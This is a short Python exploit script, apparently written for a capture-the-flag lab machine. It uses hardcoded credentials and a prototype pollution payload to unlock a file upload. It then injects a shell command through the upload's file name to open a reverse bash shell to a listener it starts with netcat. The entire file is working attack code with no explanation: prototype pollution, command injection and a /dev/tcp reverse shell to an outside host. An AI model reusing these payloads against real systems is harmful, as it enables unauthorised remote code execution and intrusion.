import urllib3
import time, subprocess
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()

url = 'http://10.10.10.235:31337'

data = {"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "something", "__proto__": {"canUpload": True}}}
session.put(url, verify=False, proxies=proxies, json=data)

uploadURL = url + "/upload"

nc_listener = subprocess.Popen(["nc","-nvlp","3333"])
time.sleep(1)

data = {"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash >& /dev/tcp/10.10.14.2/3333 0>&1\""}
session.post(uploadURL, verify=False, proxies=proxies, json=data)

nc_listener.wait()